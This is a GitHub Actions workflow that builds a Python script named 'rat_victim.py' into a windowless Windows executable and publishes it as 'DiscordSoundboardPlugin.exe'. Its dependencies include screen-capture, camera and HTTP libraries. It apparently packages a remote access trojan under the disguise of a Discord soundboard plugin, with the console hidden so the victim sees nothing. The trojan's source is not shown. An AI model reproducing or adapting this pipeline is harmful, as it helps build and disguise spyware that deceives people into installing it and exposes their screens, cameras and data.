name: Build Windows EXE
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Install dependencies
        run: pip install pyinstaller pillow mss requests opencv-python
      - name: Build EXE
        run: pyinstaller --onefile --noconsole --name "DiscordSoundboardPlugin" rat_victim.py
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: DiscordSoundboardPlugin
          path: dist/DiscordSoundboardPlugin.exe
